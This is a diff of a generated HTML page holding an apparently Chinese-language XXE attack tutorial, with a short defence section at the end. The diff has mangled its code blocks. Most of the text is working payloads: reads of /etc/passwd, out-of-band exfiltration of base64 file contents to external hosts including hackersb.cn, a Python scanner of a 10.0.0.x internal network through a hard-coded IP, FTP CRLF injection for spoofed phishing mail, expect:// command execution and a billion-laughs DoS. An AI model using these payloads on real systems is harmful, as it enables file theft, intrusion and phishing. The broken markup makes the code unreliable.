@@ -50,7 +50,7 @@
                     </h1>
                     <h2 class="headline">
                     Jan 24, 2019 00:00
-                    · 3166 words
+                    · 3165 words
                     · 7 minute read
                       <span class="tags">
                       
@@ -81,14 +81,12 @@
 <li><a href="#xxe利用">xxe利用</a>
 <ul>
 <li><a href="#normal-xxe">Normal XXE</a></li>
-<li><a href="#http内网主机探测">http内网主机探测</a></li>
-<li><a href="#http内网主机端口扫描">http内网主机端口扫描</a></li>
-<li><a href="#钓鱼">钓鱼</a></li>
-<li><a href="#php-expect-rce">PHP expect RCE</a></li>
-<li><a href="#xxe-dos">xxe dos</a></li>
-<li><a href="#json-content-type-xxe">JSON content-type XXE</a></li>
+<li><a href="#blind-oob-xxe">Blind OOB XXE</a></li>
 </ul></li>
-<li><a href="#xxe防御">xxe防御</a></li>
+</ul></li>
+<li><a href="#stuff-user-stuff"><stuff>user</stuff></a></li>
+<li><a href="#print-base64-b64decode-coded-string">print base64.b64decode(coded_string)</a>
+<ul>
 <li><a href="#参考资料">参考资料</a></li>
 </ul></li>
 </ul>
@@ -238,169 +236,169 @@
 <h3 id="normal-xxe">Normal XXE</h3>
 
 <ul>
-<li><p>无特殊符号读取
-xml.php
-```
-&lt;?php</p>
-
-<p>libxml_disable_entity_loader (false);
-$xmlfile = file_get_contents(&lsquo;php://input&rsquo;);
-$dom = new DOMDocument();
-$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
-$creds = simplexml_import_dom($dom);
-echo $creds;</p></li>
+<li>无特殊符号读取</li>
 </ul>
 
-<p>?&gt;</p>
+<p>xml.php</p>
 
-<pre><code>
-payload:
+<pre><code>&lt;?php
 
+    libxml_disable_entity_loader (false);
+    $xmlfile = file_get_contents('php://input');
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+
+?&gt;
 </code></pre>
 
-<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?&gt;
-&lt;!DOCTYPE dtd [<br />
-&lt;!ENTITY file SYSTEM &ldquo;file:///c:/windows/system.ini&rdquo;&gt; ]&gt;
-<ifish>&file;</ifish></p>
+<p>payload:</p>
 
-<pre><code>
-- 有特殊符号读取
-把数据放在 CDATA 中输出就能进行绕过
-
-payload:
-
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE dtd [  
+&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
+&lt;ifish&gt;&amp;file;&lt;/ifish&gt;
 </code></pre>
 
-<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?&gt;
+<ul>
+<li>有特殊符号读取</li>
+</ul>
+
+<p>把数据放在 CDATA 中输出就能进行绕过</p>
+
+<p>payload:</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
 &lt;!DOCTYPE roottag [
-&lt;!ENTITY % start &ldquo;&lt;![CDATA[&ldquo;&gt;<br />
-&lt;!ENTITY % goodies SYSTEM &ldquo;file:///d:/test.txt&rdquo;&gt;<br />
-&lt;!ENTITY % end &ldquo;]]&gt;&rdquo;&gt;<br />
-&lt;!ENTITY % dtd SYSTEM &ldquo;<a href="http://ip/evil.dtd&quot;&gt;">http://ip/evil.dtd&quot;&gt;</a>
-%dtd; ]&gt;</p>
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
 
-<p><roottag>&all;</roottag></p>
-
-<pre><code>
-evil.dtd
-
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
 </code></pre>
 
-<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;
-&lt;!ENTITY all &ldquo;%start;%goodies;%end;&rdquo;&gt;</p>
+<p>evil.dtd</p>
 
-<pre><code>利用外部dtd,将实体拼接,不能在xml直接拼接
-
-### Blind OOB XXE
-xml.php
-
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
 </code></pre>
 
-<p>&lt;?php</p>
+<p>利用外部dtd,将实体拼接,不能在xml直接拼接</p>
 
-<p>libxml_disable_entity_loader (false);
-$xmlfile = file_get_contents(&lsquo;php://input&rsquo;);
+<h3 id="blind-oob-xxe">Blind OOB XXE</h3>
+
+<p>xml.php</p>
+
+<pre><code>&lt;?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents('php://input');
 $dom = new DOMDocument();
-$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
-?&gt;</p>
-
-<pre><code>
-payload1：
-
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?&gt;
 </code></pre>
 
-<p>&lt;!DOCTYPE convert [
-&lt;!ENTITY % remote SYSTEM &ldquo;<a href="http://ip/test.dtd&quot;&gt;">http://ip/test.dtd&quot;&gt;</a>
+<p>payload1：</p>
+
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
 %remote;%int;%send;
-]&gt;</p>
-
-<pre><code>
-test.dtd:
-
-</code></pre>
-
-<p>&lt;!ENTITY % file SYSTEM &ldquo;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&rdquo;&gt;
-&lt;!ENTITY % int &ldquo;&lt;!ENTITY &#37; send SYSTEM &lsquo;<a href="http://ip:9999?p=%file;'&gt;&quot;&gt;">http://ip:9999?p=%file;'&gt;&quot;&gt;</a></p>
-
-<pre><code>
-or
-
-payload2:
-
-````
-&lt;!DOCTYPE a [ 
-&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
-&lt;!ENTITY % dtd SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&gt;
-%dtd;
-%mydata;
 ]&gt;
 </code></pre>
 
-<p>attack.dtd：</p>
+<p>test.dtd:</p>
 
-<pre><code>&lt;!ENTITY % all
-&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &quot;http://www.hackersb.cn/?%file&quot;&gt;&quot;
-&gt;
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999?p=%file;'&gt;&quot;&gt;
 </code></pre>
 
-<p>发送payload以后就可以在<a href="http://www.hackersb.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容">http://www.hackersb.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容</a></p>
+<p>or</p>
 
-<h3 id="http内网主机探测">http内网主机探测</h3>
+<p>payload2:</p>
 
-<p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
+<p>````
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &ldquo;php://filter/read=convert.base64-encode/resource=/etc/passwd&rdquo;&gt;
+&lt;!ENTITY % dtd SYSTEM &ldquo;<a href="http://www.hackersb.cn/attack.dtd&quot;&gt;">http://www.hackersb.cn/attack.dtd&quot;&gt;</a>
+%dtd;
+%mydata;
+]&gt;</p>
 
-<p>探测脚本:</p>
+<pre><code>
+attack.dtd：
 
-<pre><code>import requests
-import base64
+</code></pre>
 
-#Origtional XML that the server accepts
-#&lt;xml&gt;
-#    &lt;stuff&gt;user&lt;/stuff&gt;
-#&lt;/xml&gt;
+<p>&lt;!ENTITY % all
+&ldquo;&lt;!ENTITY &#x25; mydata SYSTEM &ldquo;<a href="http://www.hackersb.cn/?%file&quot;&gt;&quot;">http://www.hackersb.cn/?%file&quot;&gt;&quot;</a>
+&gt;</p>
 
+<pre><code>
+发送payload以后就可以在http://www.hackersb.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容
 
-def build_xml(string):
-    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + '&quot;' + string + '&quot;' + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
-    send_xml(xml)
+### http内网主机探测
+我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了
 
-def send_xml(xml):
-    headers = {'Content-Type': 'application/xml'}
-    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
-    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
-    print coded_string
-#   print base64.b64decode(coded_string)
-for i in range(1, 255):
+探测脚本:
+
+</code></pre>
+
+<p>import requests
+import base64</p>
+
+<p>#Origtional XML that the server accepts
+#<xml></p>
+
+<h1 id="stuff-user-stuff"><stuff>user</stuff></h1>
+
+<p>#</xml></p>
+
+<p>def build_xml(string):
+    xml = &ldquo;&rdquo;&rdquo;&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;ISO-8859-1&rdquo;?&gt;&ldquo;&rdquo;&rdquo;
+    xml = xml + &ldquo;\r\n&rdquo; + &ldquo;&rdquo;&rdquo;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&ldquo;&rdquo;&rdquo;
+    xml = xml + &ldquo;\r\n&rdquo; + &ldquo;&rdquo;&rdquo;&lt;!ENTITY xxe SYSTEM &ldquo;&rdquo;&rdquo; + &lsquo;&ldquo;&rsquo; + string + &lsquo;&rdquo;&rsquo; + &ldquo;&rdquo;&ldquo;&gt;]&gt;&rdquo;&ldquo;&rdquo;
+    xml = xml + &ldquo;\r\n&rdquo; + &ldquo;&rdquo;&rdquo;<xml>&rdquo;&ldquo;&rdquo;
+    xml = xml + &ldquo;\r\n&rdquo; + &ldquo;&rdquo;&rdquo;    <stuff>&xxe;</stuff>&rdquo;&ldquo;&rdquo;
+    xml = xml + &ldquo;\r\n&rdquo; + &ldquo;&rdquo;&rdquo;</xml>&rdquo;&ldquo;&rdquo;
+    send_xml(xml)</p>
+
+<p>def send_xml(xml):
+    headers = {&lsquo;Content-Type&rsquo;: &lsquo;application/xml&rsquo;}
+    x = requests.post(&lsquo;<a href="http://34.200.157.128/CUSTOM/NEW_XEE.php'">http://34.200.157.128/CUSTOM/NEW_XEE.php'</a>, data=xml, headers=headers, timeout=5).text
+    coded_string = x.split(&rsquo; &lsquo;)[-2] # a little split to get only the base64 encoded value
+    print coded_string</p>
+
+<h1 id="print-base64-b64decode-coded-string">print base64.b64decode(coded_string)</h1>
+
+<p>for i in range(1, 255):
     try:
         i = str(i)
-        ip = '10.0.0.' + i
-        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
+        ip = &lsquo;10.0.0.&rsquo; + i
+        string = &lsquo;php://filter/convert.base64-encode/resource=http://&rsquo; + ip + &lsquo;/&rsquo;
         print string
         build_xml(string)
     except:
-continue
+continue</p>
+
+<pre><code>
+### http内网主机端口扫描
+利用burp遍历端口
+
+### 钓鱼
+如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）
+
+Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。
+
+但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：
+
+ex:
+
 </code></pre>
 
-<h3 id="http内网主机端口扫描">http内网主机端口扫描</h3>
-
-<p>利用burp遍历端口</p>
-
-<h3 id="钓鱼">钓鱼</h3>
-
-<p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>
-
-<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
-
-<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
-
-<p>ex:</p>
-
-<pre><code>ftp://a%0D%0A
+<p><a href="ftp://a%0D%0A">ftp://a%0D%0A</a>
 EHLO%20a%0D%0A
 MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
 RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
@@ -413,148 +411,168 @@ test!%0A
 %0D%0A
 .%0D%0A
 QUIT%0D%0A
-:a@VULNERABLESYSTEM.com:25
+:a@VULNERABLESYSTEM.com:25</p>
+
+<pre><code>
+### PHP expect RCE
+PHP的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE
+
+payload:
+
 </code></pre>
 
-<h3 id="php-expect-rce">PHP expect RCE</h3>
+<p>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &ldquo;expect://id&rdquo;&gt;]&gt;
+<dir>
+<file>&cmd;</file>
+</dir></p>
 
-<p>PHP的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
+<pre><code>
+### xxe dos
+payload:
 
-<p>payload:</p>
-
-<pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;
-&lt;dir&gt;
-&lt;file&gt;&amp;cmd;&lt;/file&gt;
-&lt;/dir&gt;
 </code></pre>
 
-<h3 id="xxe-dos">xxe dos</h3>
-
-<p>payload:</p>
-
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+<p>&lt;?xml version=&ldquo;1.0&rdquo;?&gt;
      &lt;!DOCTYPE lolz [
-     &lt;!ENTITY lol &quot;lol&quot;&gt;
-     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
-     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
-     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
-     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
-     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
-     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
-     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
-     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+     &lt;!ENTITY lol &ldquo;lol&rdquo;&gt;
+     &lt;!ENTITY lol2 &ldquo;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&rdquo;&gt;
+     &lt;!ENTITY lol3 &ldquo;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&rdquo;&gt;
+     &lt;!ENTITY lol4 &ldquo;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&rdquo;&gt;
+     &lt;!ENTITY lol5 &ldquo;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&rdquo;&gt;
+     &lt;!ENTITY lol6 &ldquo;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&rdquo;&gt;
+     &lt;!ENTITY lol7 &ldquo;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&rdquo;&gt;
+     &lt;!ENTITY lol8 &ldquo;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&rdquo;&gt;
+     &lt;!ENTITY lol9 &ldquo;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&rdquo;&gt;
      ]&gt;
-     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+     <lolz>&lol9;</lolz></p>
+
+<pre><code>
+### JSON content-type XXE
+很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击
+
+
+原始请求和响应：
+
+HTTP Request:
+
 </code></pre>
 
-<h3 id="json-content-type-xxe">JSON content-type XXE</h3>
-
-<p>很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p>
-
-<p>原始请求和响应：</p>
-
-<p>HTTP Request:</p>
-
-<pre><code>POST /netspi HTTP/1.1
+<p>POST /netspi HTTP/1.1
 Host: someserver.netspi.com
 Accept: application/json
 Content-Type: application/json
-Content-Length: 38
+Content-Length: 38</p>
 
+<p>{&ldquo;search&rdquo;:&ldquo;name&rdquo;,&ldquo;value&rdquo;:&ldquo;netspitest&rdquo;}</p>
 
-{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}
+<pre><code>
+
+HTTP Response:
+
 </code></pre>
 
-<p>HTTP Response:</p>
-
-<pre><code>HTTP/1.1 200 OK
+<p>HTTP/1.1 200 OK
 Content-Type: application/json
-Content-Length: 43
+Content-Length: 43</p>
 
-{&quot;error&quot;: &quot;no results for name netspitest&quot;}
-现在我们尝试将 Content-Type 修改为 application/xml
+<p>{&ldquo;error&rdquo;: &ldquo;no results for name netspitest&rdquo;}
+现在我们尝试将 Content-Type 修改为 application/xml</p>
+
+<pre><code>
+进一步请求和响应：
+
+HTTP Request:
+
 </code></pre>
 
-<p>进一步请求和响应：</p>
-
-<p>HTTP Request:</p>
-
-<pre><code>POST /netspi HTTP/1.1
-Host: someserver.netspi.com
-Accept: application/json
-Content-Type: application/xml
-Content-Length: 38
-
-{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}
-</code></pre>
-
-<p>HTTP Response:</p>
-
-<pre><code>HTTP/1.1 500 Internal Server Error
-Content-Type: application/json
-Content-Length: 127
-
-{&quot;errors&quot;:{&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;}}
-可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击
-</code></pre>
-
-<p>最终的请求和响应：</p>
-
-<p>HTTP Request:</p>
-
-<pre><code>POST /netspi HTTP/1.1
+<p>POST /netspi HTTP/1.1
 Host: someserver.netspi.com
 Accept: application/json
 Content-Type: application/xml
-Content-Length: 288
+Content-Length: 38</p>
 
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
-&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;search&gt;name&lt;/search&gt;
-&lt;value&gt;&amp;xxe;&lt;/value&gt;
-&lt;/root&gt;
+<p>{&ldquo;search&rdquo;:&ldquo;name&rdquo;,&ldquo;value&rdquo;:&ldquo;netspitest&rdquo;}</p>
+
+<pre><code>
+HTTP Response:
+
 </code></pre>
 
-<p>HTTP Response:</p>
-
-<pre><code>HTTP/1.1 200 OK
+<p>HTTP/1.1 500 Internal Server Error
 Content-Type: application/json
-Content-Length: 2467
+Content-Length: 127</p>
 
-{&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash
+<p>{&ldquo;errors&rdquo;:{&ldquo;errorMessage&rdquo;:&ldquo;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&ldquo;}}
+可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p>
+
+<pre><code>
+最终的请求和响应：
+
+HTTP Request:
+
+</code></pre>
+
+<p>POST /netspi HTTP/1.1
+Host: someserver.netspi.com
+Accept: application/json
+Content-Type: application/xml
+Content-Length: 288</p>
+
+<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo; ?&gt;
+&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &ldquo;file:///etc/passwd&rdquo; &gt;]&gt;
+<root>
+<search>name</search>
+<value>&xxe;</value>
+</root></p>
+
+<pre><code>
+HTTP Response:
+
+</code></pre>
+
+<p>HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 2467</p>
+
+<p>{&ldquo;error&rdquo;: &ldquo;no results for name root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync....
+sync:x:4:65534:sync:/bin:/bin/sync&hellip;.</p>
+
+<pre><code>
+## xxe防御
+
+使用语言中推荐的禁用外部实体的方法
+
+PHP：
+
 </code></pre>
 
-<h2 id="xxe防御">xxe防御</h2>
+<p>libxml_disable_entity_loader(true);</p>
 
-<p>使用语言中推荐的禁用外部实体的方法</p>
+<pre><code>
+JAVA:
 
-<p>PHP：</p>
-
-<pre><code>libxml_disable_entity_loader(true);
 </code></pre>
 
-<p>JAVA:</p>
+<p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);</p>
 
-<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
-dbf.setExpandEntityReferences(false);
+<p>.setFeature(&ldquo;<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;,true">http://apache.org/xml/features/disallow-doctype-decl&quot;,true</a>);</p>
 
-.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+<p>.setFeature(&ldquo;<a href="http://xml.org/sax/features/external-general-entities&quot;,false">http://xml.org/sax/features/external-general-entities&quot;,false</a>)</p>
 
-.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)
+<p>.setFeature(&ldquo;<a href="http://xml.org/sax/features/external-parameter-entities&quot;,false">http://xml.org/sax/features/external-parameter-entities&quot;,false</a>);</p>
 
-.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
+<pre><code>
+Python：
+
 </code></pre>
 
-<p>Python：</p>
-
-<pre><code>from lxml import etree
+<p>from lxml import etree
 xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
-</code></pre>
+```</p>
 
 <h2 id="参考资料">参考资料</h2>
 
